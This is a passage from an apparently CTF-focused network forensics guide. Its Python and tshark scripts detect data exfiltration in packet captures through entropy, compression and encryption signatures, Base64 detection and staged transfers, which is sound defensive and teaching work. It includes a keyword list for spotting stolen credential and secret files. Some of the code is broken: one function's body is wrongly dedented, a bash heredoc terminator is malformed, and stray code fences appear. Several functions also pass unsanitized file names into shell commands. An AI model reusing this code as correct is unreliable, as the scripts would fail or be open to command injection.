    for line in os.popen(cmd).read().strip().split('\n'):
        if not line or '\t' not in line:
            continue
        
        stream_id, size = line.split('\t')
        
        if stream_id in streams:
            try:
                streams[stream_id]['bytes'] += int(size)
                streams[stream_id]['packets'] += 1
            except ValueError:
                pass
    
    # Analyze streams
    print("[*] TCP Stream Analysis:")
    print("=" * 80)
    
    suspicious_streams = []
    
    for stream_id, info in streams.items():
        # [Inference] Heuristics for suspicious streams
        is_suspicious = False
        reasons = []
        
        # Large transfer
        if info['bytes'] > 10 * 1024 * 1024:  # > 10 MB
            is_suspicious = True
            reasons.append(f"Large transfer: {info['bytes'] / (1024*1024):.2f} MB")
        
        # Unusual port
        common_ports = ['80', '443', '53', '22', '21', '25']
        if info['port'] not in common_ports:
            is_suspicious = True
            reasons.append(f"Unusual port: {info['port']}")
        
        if is_suspicious:
            print(f"\n[STREAM {stream_id}] {info['src']} -> {info['dst']}:{info['port']}")
            for reason in reasons:
                print(f"  - {reason}")
            
            suspicious_streams.append(stream_id)
    
    return suspicious_streams
```

### Statistical Anomaly Detection

```python
def detect_transfer_anomalies(pcap_file):
    """
    Statistical analysis to detect anomalous data transfers
    [Inference] Uses statistical methods to identify outliers
    """
    import os
    import statistics
    
    # Get per-host byte counts
    cmd = f'tshark -r {pcap_file} -q -z endpoints,ip'
    output = os.popen(cmd).read()
    
    host_bytes = {}
    
    for line in output.split('\n'):
        parts = line.split()
        if len(parts) >= 6 and parts[0] != '|':
            try:
                ip = parts[0]
                tx_bytes = int(parts[3])
                rx_bytes = int(parts[4])
                total = tx_bytes + rx_bytes
                
                host_bytes[ip] = {
                    'tx': tx_bytes,
                    'rx': rx_bytes,
                    'total': total
                }
            except (ValueError, IndexError):
                continue
    
    if len(host_bytes) < 2:
        print("[!] Insufficient data for statistical analysis")
        return
    
    # Calculate statistics
    total_bytes = [h['total'] for h in host_bytes.values()]
    tx_bytes = [h['tx'] for h in host_bytes.values()]
    
    mean_total = statistics.mean(total_bytes)
    stdev_total = statistics.stdev(total_bytes) if len(total_bytes) > 1 else 0
    
    mean_tx = statistics.mean(tx_bytes)
    stdev_tx = statistics.stdev(tx_bytes) if len(tx_bytes) > 1 else 0
    
    print("[*] Traffic Statistics:")
    print(f"  Mean total: {mean_total / (1024*1024):.2f} MB")
    print(f"  Std dev: {stdev_total / (1024*1024):.2f} MB")
    
    # Identify outliers (> 2 standard deviations)
    print("\n[*] Statistical Outliers (>2σ):")
    
    outliers = []
    
    for ip, stats in host_bytes.items():
        # Z-score for total bytes
        z_score_total = (stats['total'] - mean_total) / stdev_total if stdev_total > 0 else 0
        z_score_tx = (stats['tx'] - mean_tx) / stdev_tx if stdev_tx > 0 else 0
        
        if abs(z_score_total) > 2 or abs(z_score_tx) > 2:
            print(f"\n  {ip}:")
            print(f"    Total: {stats['total'] / (1024*1024):.2f} MB (z={z_score_total:.2f})")
            print(f"    TX: {stats['tx'] / (1024*1024):.2f} MB (z={z_score_tx:.2f})")
            print(f"    RX: {stats['rx'] / (1024*1024):.2f} MB")
            
            outliers.append(ip)
    
    return outliers
```

## Compression Identification

Detecting compressed data helps identify exfiltration attempts where attackers compress data before transfer to reduce size and detection.

### File Signature Detection

```python
def detect_compressed_files(pcap_file):
    """
    Identify compressed file transfers by detecting file signatures
    """
    import os
    
    # Common compression signatures
    COMPRESSION_SIGNATURES = {
        b'\x1f\x8b': 'gzip',
        b'PK\x03\x04': 'ZIP',
        b'PK\x05\x06': 'ZIP (empty)',
        b'PK\x07\x08': 'ZIP (spanned)',
        b'Rar!\x1a\x07': 'RAR',
        b'7z\xbc\xaf\x27\x1c': '7-Zip',
        b'BZh': 'bzip2',
        b'\xfd7zXZ\x00': 'xz',
        b'\x28\xb5\x2f\xfd': 'zstd',
        b'LZIP': 'lzip',
    }
    
    # Extract HTTP objects
    os.system(f'tshark -r {pcap_file} --export-objects http,/tmp/http_objects/ 2>/dev/null')
    
    # Check for compression signatures
    print("[*] Scanning for compressed files in HTTP transfers:")
    
    compressed_files = []
    
    if os.path.exists('/tmp/http_objects'):
        for filename in os.listdir('/tmp/http_objects'):
            filepath = os.path.join('/tmp/http_objects', filename)
            
            with open(filepath, 'rb') as f:
                header = f.read(16)
                
                for sig, comp_type in COMPRESSION_SIGNATURES.items():
                    if header.startswith(sig):
                        size = os.path.getsize(filepath)
                        print(f"  [{comp_type}] {filename} ({size} bytes)")
                        compressed_files.append({
                            'file': filename,
                            'type': comp_type,
                            'size': size
                        })
                        break
    
    # Check raw packet payloads
    cmd = f'tshark -r {pcap_file} -T fields -e tcp.payload'
    output = os.popen(cmd).read()
    
    print("\n[*] Checking packet payloads for compression signatures:")
    
    packet_count = 0
    for line in output.strip().split('\n'):
        if not line:
            continue
        
        try:
            payload = bytes.fromhex(line.replace(':', ''))
            
            for sig, comp_type in COMPRESSION_SIGNATURES.items():
                if payload.startswith(sig):
                    packet_count += 1
                    print(f"  [{comp_type}] Found in packet payload ({len(payload)} bytes)")
                    break
        except ValueError:
            continue
    
    print(f"\n[*] Total compressed transfers: {len(compressed_files)} files, {packet_count} packets")
    
    return compressed_files
```

### Entropy-Based Compression Detection

```python
def detect_compression_by_entropy(pcap_file, entropy_threshold=7.5):
    """
    Detect compressed/encrypted data using entropy analysis
    Compressed data typically has high entropy (7.5-8.0)
    """
    import os
    import math
    from collections import Counter
    
    # Extract TCP payloads with metadata
    cmd = (f'tshark -r {pcap_file} -Y "tcp.len > 100" '
           f'-T fields -e frame.number -e ip.src -e ip.dst -e tcp.payload')
    
    output = os.popen(cmd).read()
    
    print("[*] Entropy Analysis of TCP Payloads:")
    print("=" * 80)
    
    high_entropy_transfers = []
    
    for line in output.strip().split('\n'):
        if not line or line.count('\t') < 3:
            continue
        
        parts = line.split('\t')
        frame_num = parts[0]
        src = parts[1]
        dst = parts[2]
        payload_hex = parts[3] if len(parts) > 3 else ''
        
        if not payload_hex:
            continue
        
        try:
            payload = bytes.fromhex(payload_hex.replace(':', ''))
        except ValueError:
            continue
        
        if len(payload) < 100:
            continue
        
        # Calculate entropy
        counter = Counter(payload)
        entropy = -sum((count/len(payload)) * math.log2(count/len(payload)) 
                      for count in counter.values())
        
        if entropy >= entropy_threshold:
            print(f"\n[Frame {frame_num}] {src} -> {dst}")
            print(f"  Payload size: {len(payload)} bytes")
            print(f"  Entropy: {entropy:.3f}")
            
            # [Inference] Classify by entropy range
            if entropy > 7.9:
                classification = "Likely encrypted"
            elif entropy > 7.5:
                classification = "Likely compressed"
            else:
                classification = "Compressed or structured"
            
            print(f"  Classification: {classification}")
            
            high_entropy_transfers.append({
                'frame': frame_num,
                'src': src,
                'dst': dst,
                'size': len(payload),
                'entropy': entropy
            })
    
    print(f"\n[*] Total high-entropy transfers: {len(high_entropy_transfers)}")
    
    return high_entropy_transfers
```

### Compression Ratio Analysis

```python
def analyze_compression_indicators(pcap_file):
    """
    Analyze HTTP Content-Encoding headers and response sizes
    to identify compressed transfers
    """
    import os
    
    # Check HTTP Content-Encoding headers
    cmd = (f'tshark -r {pcap_file} -Y "http.content_encoding" ' f'-T fields -e ip.src -e ip.dst -e http.content_encoding ' f'-e http.content_length -e http.content_length_header')

output = os.popen(cmd).read()

print("[*] HTTP Compression Detection:")
print("=" * 70)

compressed_responses = []

for line in output.strip().split('\n'):
    if not line:
        continue
    
    parts = line.split('\t')
    if len(parts) >= 3:
        src = parts[0]
        dst = parts[1]
        encoding = parts[2]
        
        content_length = parts[3] if len(parts) > 3 else 'unknown'
        
        print(f"{src} -> {dst}")
        print(f"  Encoding: {encoding}")
        print(f"  Size: {content_length} bytes")
        
        compressed_responses.append({
            'src': src,
            'dst': dst,
            'encoding': encoding,
            'size': content_length
        })

# Analyze transfer-encoding
cmd = (f'tshark -r {pcap_file} -Y "http.transfer_encoding" '
       f'-T fields -e ip.src -e http.transfer_encoding')

output = os.popen(cmd).read()

if output.strip():
    print("\n[*] HTTP Transfer-Encoding:")
    for line in output.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 2:
                print(f"  {parts[0]}: {parts[1]}")

return compressed_responses
````

### Archive Content Analysis

```python
def analyze_archive_contents(file_path):
    """
    Analyze contents of compressed archives found in traffic
    [Unverified] Requires appropriate extraction tools installed
    """
    import os
    import subprocess
    
    file_type = subprocess.run(['file', '-b', file_path], 
                              capture_output=True, text=True).stdout.strip()
    
    print(f"[*] Analyzing: {file_path}")
    print(f"[*] Type: {file_type}")
    
    contents = []
    
    # ZIP archives
    if 'Zip' in file_type or file_path.endswith('.zip'):
        try:
            result = subprocess.run(['unzip', '-l', file_path],
                                  capture_output=True, text=True)
            print("\n[*] ZIP Contents:")
            print(result.stdout)
            
            # Extract file list
            for line in result.stdout.split('\n'):
                if line.strip() and not line.startswith('Archive:') and \
                   not line.startswith('Length') and not line.startswith('---'):
                    parts = line.split()
                    if len(parts) >= 4:
                        contents.append(parts[-1])
        except Exception as e:
            print(f"[!] Error analyzing ZIP: {e}")
    
    # TAR/GZIP archives
    elif 'gzip' in file_type.lower() or 'tar' in file_type.lower():
        try:
            result = subprocess.run(['tar', '-tzf', file_path],
                                  capture_output=True, text=True)
            print("\n[*] TAR/GZIP Contents:")
            print(result.stdout)
            contents = result.stdout.strip().split('\n')
        except Exception as e:
            print(f"[!] Error analyzing TAR/GZIP: {e}")
    
    # RAR archives
    elif 'RAR' in file_type:
        try:
            result = subprocess.run(['unrar', 'l', file_path],
                                  capture_output=True, text=True)
            print("\n[*] RAR Contents:")
            print(result.stdout)
        except Exception as e:
            print(f"[!] Error analyzing RAR: {e}")
    
    # 7-Zip archives
    elif '7-zip' in file_type.lower():
        try:
            result = subprocess.run(['7z', 'l', file_path],
                                  capture_output=True, text=True)
            print("\n[*] 7-Zip Contents:")
            print(result.stdout)
        except Exception as e:
            print(f"[!] Error analyzing 7-Zip: {e}")
    
    # Check for suspicious patterns in filenames
    suspicious_patterns = [
        'password', 'secret', 'confidential', 'private',
        'database', '.sql', 'backup', 'credentials',
        'key', 'token', 'config'
    ]
    
    print("\n[*] Suspicious files detected:")
    for filename in contents:
        for pattern in suspicious_patterns:
            if pattern.lower() in filename.lower():
                print(f"  [!] {filename} (matches: {pattern})")
                break
    
    return contents
````

## Encryption Pre-Transfer

Detecting encryption applied before data exfiltration helps identify sophisticated attack patterns.

### TLS/SSL Certificate Analysis

```bash
# Extract TLS certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" \
    -T fields -e tls.handshake.certificate | head -1 | \
    xxd -r -p > cert.der

# Convert and view certificate
openssl x509 -inform der -in cert.der -text -noout

# Extract certificate subjects and issuers
tshark -r capture.pcap -Y "tls.handshake.certificate" \
    -T fields -e x509ce.dNSName -e x509sat.uTF8String
```

**Certificate Chain Analysis:**

```python
def analyze_tls_certificates(pcap_file):
    """
    Extract and analyze TLS certificates from capture
    """
    import os
    import subprocess
    
    # Extract certificate data
    cmd = (f'tshark -r {pcap_file} -Y "tls.handshake.certificate" '
           f'-T fields -e ip.dst -e tls.handshake.certificate')
    
    output = os.popen(cmd).read()
    
    print("[*] TLS Certificate Analysis:")
    print("=" * 70)
    
    cert_count = 0
    
    for line in output.strip().split('\n'):
        if not line or '\t' not in line:
            continue
        
        parts = line.split('\t')
        dst = parts[0]
        cert_hex = parts[1] if len(parts) > 1 else ''
        
        if not cert_hex:
            continue
        
        cert_count += 1
        cert_file = f'/tmp/cert_{cert_count}.der'
        
        # Write certificate to file
        try:
            cert_bytes = bytes.fromhex(cert_hex.replace(':', ''))
            with open(cert_file, 'wb') as f:
                f.write(cert_bytes)
        except ValueError:
            continue
        
        # Parse with openssl
        try:
            result = subprocess.run(
                ['openssl', 'x509', '-inform', 'der', '-in', cert_file, 
                 '-text', '-noout'],
                capture_output=True, text=True, timeout=5
            )
            
            print(f"\n[Certificate {cert_count}] Destination: {dst}")
            
            # Extract key information
            for line in result.stdout.split('\n'):
                if 'Subject:' in line or 'Issuer:' in line or \
                   'DNS:' in line or 'Not After' in line:
                    print(f"  {line.strip()}")
            
            # Check for self-signed certificates (suspicious)
            if 'Self-signed' in result.stdout or \
               result.stdout.count('Issuer:') == result.stdout.count('Subject:'):
                print("  [SUSPICIOUS] Potentially self-signed certificate")
        
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout parsing certificate {cert_count}")
        except Exception as e:
            print(f"[!] Error parsing certificate: {e}")
    
    print(f"\n[*] Total certificates analyzed: {cert_count}")
```

### Encrypted Payload Detection

```python
def detect_encrypted_payloads(pcap_file, min_size=256):
    """
    Detect encrypted data in non-TLS protocols
    Uses entropy and statistical tests
    """
    import os
    import math
    from collections import Counter
    
    # Extract unencrypted protocol payloads
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "tcp && !tls && !ssl && tcp.len > {min_size}" '
           f'-T fields -e frame.number -e ip.src -e ip.dst '
           f'-e tcp.dstport -e tcp.payload')
    
    output = os.popen(cmd).read()
    
    print("[*] Detecting Encrypted Payloads in Cleartext Protocols:")
    print("=" * 70)
    
    encrypted_streams = []
    
    for line in output.strip().split('\n'):
        if not line or line.count('\t') < 4:
            continue
        
        parts = line.split('\t')
        frame = parts[0]
        src = parts[1]
        dst = parts[2]
        port = parts[3]
        payload_hex = parts[4] if len(parts) > 4 else ''
        
        if not payload_hex:
            continue
        
        try:
            payload = bytes.fromhex(payload_hex.replace(':', ''))
        except ValueError:
            continue
        
        if len(payload) < min_size:
            continue
        
        # Calculate entropy
        counter = Counter(payload)
        entropy = -sum((count/len(payload)) * math.log2(count/len(payload)) 
                      for count in counter.values())
        
        # Chi-square test for randomness
        expected_freq = len(payload) / 256
        chi_square = sum((counter.get(i, 0) - expected_freq) ** 2 / expected_freq 
                        for i in range(256))
        
        # [Inference] High entropy + low chi-square indicates encryption
        if entropy > 7.8 and chi_square < 300:
            print(f"\n[Frame {frame}] {src} -> {dst}:{port}")
            print(f"  Size: {len(payload)} bytes")
            print(f"  Entropy: {entropy:.3f}")
            print(f"  Chi-square: {chi_square:.2f}")
            print(f"  [LIKELY ENCRYPTED] High entropy in cleartext protocol")
            
            # Check first bytes for common encryption indicators
            header = payload[:16]
            
            # OpenSSL encrypted files often start with "Salted__"
            if header.startswith(b'Salted__'):
                print(f"  [OpenSSL] Salted encryption detected")
            
            # Check for block cipher patterns (16-byte alignment)
            if len(payload) % 16 == 0:
                print(f"  [AES/DES] Block cipher alignment detected")
            
            encrypted_streams.append({
                'frame': frame,
                'src': src,
                'dst': dst,
                'port': port,
                'size': len(payload),
                'entropy': entropy
            })
    
    print(f"\n[*] Total encrypted payloads detected: {len(encrypted_streams)}")
    
    return encrypted_streams
```

### Cryptographic Protocol Identification

```python
def identify_crypto_protocols(pcap_file):
    """
    Identify use of cryptographic protocols and tools
    """
    import os
    
    crypto_indicators = {
        'SSH': 'tcp.port == 22',
        'TLS/HTTPS': 'tls',
        'SFTP': 'tcp.port == 115 || ssh',
        'IPSec': 'esp || ah',
        'OpenVPN': 'udp.port == 1194',
        'WireGuard': 'udp.port == 51820',
    }
    
    print("[*] Cryptographic Protocol Detection:")
    print("=" * 70)
    
    detected_protocols = []
    
    for protocol, filter_str in crypto_indicators.items():
        cmd = f'tshark -r {pcap_file} -Y "{filter_str}" | wc -l'
        count = int(os.popen(cmd).read().strip())
        
        if count > 0:
            print(f"\n[{protocol}] {count} packets detected")
            detected_protocols.append(protocol)
            
            # Get endpoints
            if 'tcp' in filter_str or 'tls' in filter_str:
                cmd = (f'tshark -r {pcap_file} -Y "{filter_str}" '
                       f'-T fields -e ip.src -e ip.dst | sort -u | head -10')
            else:
                cmd = (f'tshark -r {pcap_file} -Y "{filter_str}" '
                       f'-T fields -e ip.src -e ip.dst | sort -u | head -10')
            
            endpoints = os.popen(cmd).read().strip()
            if endpoints:
                print("  Endpoints:")
                for line in endpoints.split('\n')[:5]:
                    if line:
                        print(f"    {line}")
    
    return detected_protocols
```

### Base64 Encoding Detection

```python
def detect_base64_encoding(pcap_file):
    """
    Detect Base64-encoded data in traffic
    Often used to encode encrypted data before exfiltration
    """
    import os
    import re
    import base64
    
    # Extract text payloads
    cmd = (f'tshark -r {pcap_file} -Y "tcp.payload" '
           f'-T fields -e tcp.payload')
    
    output = os.popen(cmd).read()
    
    print("[*] Base64 Encoding Detection:")
    print("=" * 70)
    
    # Base64 pattern (at least 20 chars)
    base64_pattern = re.compile(rb'[A-Za-z0-9+/]{20,}={0,2}')
    
    base64_findings = []
    
    for line in output.strip().split('\n'):
        if not line:
            continue
        
        try:
            payload = bytes.fromhex(line.replace(':', ''))
        except ValueError:
            continue
        
        # Search for Base64 patterns
        matches = base64_pattern.findall(payload)
        
        for match in matches:
            if len(match) < 20:
                continue
            
            try:
                # Attempt to decode
                decoded = base64.b64decode(match)
                
                # Check if decoded data is binary (likely encrypted)
                printable_ratio = sum(32 <= b < 127 for b in decoded) / len(decoded)
                
                print(f"\n[Base64 Found] Length: {len(match)} bytes")
                print(f"  Encoded: {match[:60]}...")
                
                if printable_ratio > 0.8:
                    print(f"  Decoded (text): {decoded[:100]}")
                else:
                    print(f"  Decoded (binary): {decoded[:32].hex()}...")
                    
                    # Calculate entropy of decoded data
                    from collections import Counter
                    import math
                    
                    counter = Counter(decoded)
                    entropy = -sum((c/len(decoded)) * math.log2(c/len(decoded)) 
                                  for c in counter.values())
                    
                    print(f"  Entropy: {entropy:.2f}")
                    
                    if entropy > 7.5:
                        print(f"  [LIKELY ENCRYPTED] High entropy after decoding")
                
                base64_findings.append({
                    'encoded': match,
                    'decoded': decoded,
                    'entropy': entropy if printable_ratio <= 0.8 else 0
                })
            
            except Exception:
                # Not valid Base64 or decoding failed
                continue
    
    print(f"\n[*] Total Base64 sequences found: {len(base64_findings)}")
    
    return base64_findings
```

### Pre-Encryption Indicators

```python
def detect_pre_encryption_activity(pcap_file):
    """
    Detect indicators that encryption was applied before transfer
    [Inference] These are heuristic indicators, not definitive proof
    """
    import os
    
    indicators = []
    
    print("[*] Pre-Encryption Activity Indicators:")
    print("=" * 70)
    
    # 1. Check for cryptographic tool DNS queries
    crypto_tools = [
        'openssl', 'gpg', 'gnupg', 'keepass', 'veracrypt',
        'truecrypt', 'bitlocker', '7zip', 'winzip', 'cryptography'
    ]
    
    cmd = f'tshark -r {pcap_file} -Y "dns.qry.name" -T fields -e dns.qry.name'
    dns_queries = os.popen(cmd).read().lower()
    
    print("\n[1] Cryptographic Tool DNS Queries:")
    for tool in crypto_tools:
        if tool in dns_queries:
            print(f"  [!] Query for {tool} detected")
            indicators.append(f"DNS query: {tool}")
    
    # 2. File extension changes
    cmd = (f'tshark -r {pcap_file} -Y "http.request.uri" '
           f'-T fields -e http.request.uri')
    
    uris = os.popen(cmd).read()
    
    encrypted_extensions = ['.gpg', '.aes', '.enc', '.encrypted', '.pgp', '.7z']
    
    print("\n[2] Encrypted File Extensions in HTTP:")
    for ext in encrypted_extensions:
        if ext in uris.lower():
            print(f"  [!] {ext} extension detected")
            indicators.append(f"Encrypted extension: {ext}")
    
    # 3. Check for password-protected archives
    print("\n[3] Password-Protected Archive Indicators:")
    
    # Extract HTTP objects and check
    os.system(f'tshark -r {pcap_file} --export-objects http,/tmp/http_check/ 2>/dev/null')
    
    if os.path.exists('/tmp/http_check'):
        for filename in os.listdir('/tmp/http_check'):
            filepath = os.path.join('/tmp/http_check', filename)
            
            # Check ZIP files for encryption flag
            with open(filepath, 'rb') as f:
                header = f.read(30)
                
                # ZIP local file header
                if header[:4] == b'PK\x03\x04':
                    # Bit 0 of general purpose bit flag indicates encryption
                    flags = int.from_bytes(header[6:8], 'little')
                    if flags & 0x01:
                        print(f"  [!] Password-protected ZIP: {filename}")
                        indicators.append(f"Encrypted ZIP: {filename}")
    
    # 4. Unusual compression ratios (might indicate pre-encryption)
    print("\n[4] Compression Analysis:")
    
    cmd = (f'tshark -r {pcap_file} -Y "http.content_encoding" '
           f'-T fields -e http.content_length_header -e http.content_length')
    
    output = os.popen(cmd).read()
    
    for line in output.strip().split('\n'):
        if not line or '\t' not in line:
            continue
        
        parts = line.split('\t')
        if len(parts) >= 2:
            try:
                original = int(parts[0])
                compressed = int(parts[1])
                
                ratio = compressed / original if original > 0 else 0
                
                # [Inference] Encrypted data doesn't compress well
                if ratio > 0.9:  # Less than 10% compression
                    print(f"  [!] Poor compression ratio: {ratio:.2%} "
                          f"({compressed}/{original} bytes)")
                    print(f"      May indicate pre-encrypted data")
                    indicators.append("Poor compression ratio")
            
            except (ValueError, ZeroDivisionError):
                continue
    
    print(f"\n[*] Total pre-encryption indicators: {len(indicators)}")
    
    return indicators
```

### Complete Exfiltration Detection Workflow

```bash
#!/bin/bash
# Comprehensive data exfiltration detection script

PCAP="$1"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <capture.pcap>"
    exit 1
fi

echo "========================================"
echo "Data Exfiltration Analysis"
echo "========================================"
echo "Target: $PCAP"
echo

# 1. Traffic volume analysis
echo "[*] Step 1: Traffic Volume Analysis"
echo "------------------------------------"
tshark -r "$PCAP" -q -z conv,tcp | grep -E '<->' | \
    awk '{if($6>10000000) print $1, $3, $6/1048576 " MB"}' | \
    head -10

# 2. Large file transfers
echo
echo "[*] Step 2: File Transfer Detection"
echo "------------------------------------"

# HTTP file uploads
echo "HTTP POST requests:"
tshark -r "$PCAP" -Y "http.request.method == POST" \
    -T fields -e ip.src -e http.host -e http.content_length | \
    awk '{if($3>1000000) print $1, $2, $3/1048576 " MB"}' | head -5

# FTP transfers
echo
echo "FTP file operations:"
tshark -r "$PCAP" -Y "ftp.request.command == STOR || ftp.request.command == RETR" \
    -T fields -e ftp.request.command -e ftp.request.arg | head -10

# 3. DNS exfiltration
echo
echo "[*] Step 3: DNS Exfiltration Detection"
echo "------------------------------------"
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | \
    awk '{if(length($1)>50) print $1}' | head -5

# 4. ICMP tunneling
echo
echo "[*] Step 4: ICMP Covert Channel Detection"
echo "------------------------------------"
tshark -r "$PCAP" -Y "icmp && data.len > 50" \
    -T fields -e ip.src -e ip.dst -e data.len | head -5

# 5. Compression detection
echo
echo "[*] Step 5: Compressed Data Detection"
echo "------------------------------------"
tshark -r "$PCAP" --export-objects http,/tmp/exfil_check/ 2>/dev/null

if [ -d "/tmp/exfil_check" ]; then
    for file in /tmp/exfil_check/*; do
        if [ -f "$file" ]; then
            file_type=$(file -b "$file")
            if echo "$file_type" | grep -qiE "compress|archive|zip|gzip|rar"; then
                echo "Compressed file: $(basename "$file") - $file_type"
            fi
        fi
    done
fi

# 6. Encryption indicators
echo
echo "[*] Step 6: Encryption Detection"
echo "------------------------------------"
echo "TLS/SSL connections:"
tshark -r "$PCAP" -Y "tls.handshake.type == 1" | wc -l

echo "Self-signed certificates:"
tshark -r "$PCAP" -Y "tls.handshake.certificate" \
    -T fields -e x509sat.printableString | grep -i "self" | wc -l

# 7. High-entropy payloads
echo
echo "[*] Step 7: Statistical Analysis"
echo "------------------------------------"
python3 << 'EOF'
import sys
import subprocess
import math
from collections import Counter

pcap = sys.argv[1] if len(sys.argv) > 1 else "$PCAP"

# Get TCP payloads
result = subprocess.run(
    ['tshark', '-r', pcap, '-Y', 'tcp.len > 500',
     '-T', 'fields', '-e', 'tcp.payload'],
    capture_output=True, text=True
)

high_entropy_count = 0

for line in result.stdout.strip().split('\n')[:20]:  # Check first 20
    if not line:
        continue
    
    try:
        payload = bytes.fromhex(line.replace(':', ''))
        counter = Counter(payload)
        entropy = -sum((c/len(payload)) * math.log2(c/len(payload)) 
                      for c in counter.values())
        
        if entropy > 7.5:
            high_entropy_count += 1
    except:
        continue

print(f"High-entropy payloads detected: {high_entropy_count}")
print("(May indicate encryption/compression)")
EOF "$PCAP"

echo
echo "[*] Analysis Complete"
echo "========================================"
```

---

**CTF-Specific Tips:**

1. **Multi-Protocol Exfiltration**: Data may be split across DNS, ICMP, and HTTP
2. **Chunked Transfers**: Large files often split into smaller pieces with sequence numbers
3. **Encoding Layers**: Data might be compressed → encrypted → base64 encoded
4. **Timing-Based**: Some CTFs hide data in packet timing rather than content
5. **Protocol Violations**: Look for protocols used outside normal parameters

**Related CTF Topics:** Packet carving and reconstruction, cryptanalysis techniques, forensic file recovery, network baseline analysis, behavioral anomaly detection

---

## Staged Exfiltration

Staged exfiltration divides data across multiple network flows, time intervals, or protocol variations to evade detection. CTF challenges embed flags across distributed transfers requiring correlation and reassembly.

### Multi-Stage Transfer Pattern Recognition

Attackers fragment data across sequential transfers. Identify stages via packet timing and payload correlation:

```bash
## Establish baseline: total data transferred per connection
tshark -r challenge.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn

## Timeline of transfers (identify gaps or clustering)
tshark -r challenge.pcap -Y tcp -T fields -e frame.time -e ip.src -e ip.dst -e tcp.len | head -100

## Identify distinct transfer phases
python3 << 'EOF'
import subprocess
from datetime import datetime

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp.len > 0', '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.dstport', '-e', 'tcp.len'],
                       capture_output=True, text=True)

transfers = []
for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 5:
        timestamp = float(parts[0])
        src = parts[1]
        dst = parts[2]
        port = parts[3]
        length = int(parts[4])
        
        transfers.append({
            'time': timestamp,
            'src': src,
            'dst': dst,
            'port': port,
            'length': length
        })

## Identify gaps (stage boundaries)
if transfers:
    transfers.sort(key=lambda x: x['time'])
    
    print("Transfer timeline:")
    for i, t in enumerate(transfers[:20]):
        time_str = datetime.fromtimestamp(t['time']).strftime('%H:%M:%S')
        print(f"{time_str} | {t['src']} → {t['dst']}:{t['port']} | {t['length']} bytes")
    
    ## Detect temporal clustering (stages)
    print("\nDetecting stages (time gaps > 5 seconds):")
    stage = 0
    for i in range(1, len(transfers)):
        time_gap = transfers[i]['time'] - transfers[i-1]['time']
        if time_gap > 5:
            stage += 1
            print(f"Stage boundary at {transfers[i-1]['time']:.0f} (gap: {time_gap:.1f}s)")
EOF
```

### Protocol-Hopping Detection

Attackers exfiltrate data via multiple protocols to bypass monitoring:

```bash
## Identify protocol mix per source-destination pair
tshark -r challenge.pcap -T fields -e ip.src -e ip.dst -e ip.proto | sort | uniq -c

## Timeline of protocol changes
tshark -r challenge.pcap -T fields -e frame.time -e ip.src -e ip.dst -e ip.proto | awk '{print $1, $2, $3, $5}' | head -50

## Detect exfiltration via multiple protocols from same source
python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'ip', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'ip.proto'],
                       capture_output=True, text=True)

proto_names = {6: 'TCP', 17: 'UDP', 1: 'ICMP'}
source_protocols = defaultdict(set)

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 3:
        src = parts[0]
        dst = parts[1]
        proto = proto_names.get(int(parts[2]), parts[2])
        
        source_protocols[src].add((proto, dst))

## Identify sources using multiple protocols (suspicious)
print("Sources using multiple protocols (potential exfiltration):")
for src, protocols in source_protocols.items():
    proto_list = set([p[0] for p in protocols])
    if len(proto_list) > 1:
        print(f"{src}: {proto_list}")
        for proto, dst in protocols:
            print(f"  → {proto} to {dst}")
EOF
```

### Encoded Payload Staging

Data may be encoded in stages: plaintext → base64 → fragmented across packets:

```bash
## Extract all payloads and test for encoding chains
tshark -r challenge.pcap -Y "tcp.len > 0" -T fields -e data.data > all_payloads.hex

python3 << 'EOF'
import base64
import sys

def decode_chain(data):
    """Attempt to decode data through encoding layers"""
    attempts = []
    current = data
    
    for layer in range(5):  ## Max 5 layers
        ## Try base64
        try:
            decoded = base64.b64decode(current)
            if len(decoded) > 0 and all(0 <= b < 256 for b in decoded):
                attempts.append(('base64', current, decoded))
                current = decoded
                continue
        except:
            pass
        
        ## Try hex
        try:
            if all(c in '0123456789abcdefABCDEF' for c in current.decode(errors='ignore')):
                decoded = bytes.fromhex(current.decode())
                attempts.append(('hex', current, decoded))
                current = decoded
                continue
        except:
            pass
        
        ## No more decodings possible
        break
    
    return attempts

## Process extracted payloads
with open('all_payloads.hex', 'r') as f:
    for line_num, line in enumerate(f):
        if not line.strip():
            continue
        
        try:
            data = bytes.fromhex(line.strip())
            
            ## Check for encoding signatures
            if data.startswith(b'EVB') or (len(data) % 4 == 0 and all(32 <= b < 127 for b in data[:20])):
                chains = decode_chain(data)
                
                if chains:
                    print(f"\nPayload {line_num}: {len(data)} bytes")
                    print(f"  Original: {data[:50].hex()}")
                    
                    for encoding, before, after in chains:
                        print(f"  After {encoding}: {after[:50].hex()} ({len(after)} bytes)")
                        
                        ## Check for flag patterns
                        if b'flag' in after.lower() or b'{' in after:
                            print(f"    → Contains potential flag!")
        except:
            pass
EOF
```

### Packet Fragmentation and IP Reassembly

Data may be fragmented across IP packets (More Fragments flag set):

```bash
## Identify fragmented IP packets
tshark -r challenge.pcap -Y "ip.flags.mf == 1 or ip.frag_offset > 0" -T fields -e frame.number -e ip.src -e ip.dst -e ip.id -e ip.frag_offset -e ip.len

## Extract fragmented streams and reassemble
python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'ip', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'ip.id', '-e', 'ip.frag_offset', '-e', 'ip.len', '-e', 'data.data'],
                       capture_output=True, text=True)

fragments = defaultdict(list)

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 6:
        src = parts[0]
        dst = parts[1]
        ip_id = parts[2]
        frag_offset = int(parts[3]) if parts[3] else 0
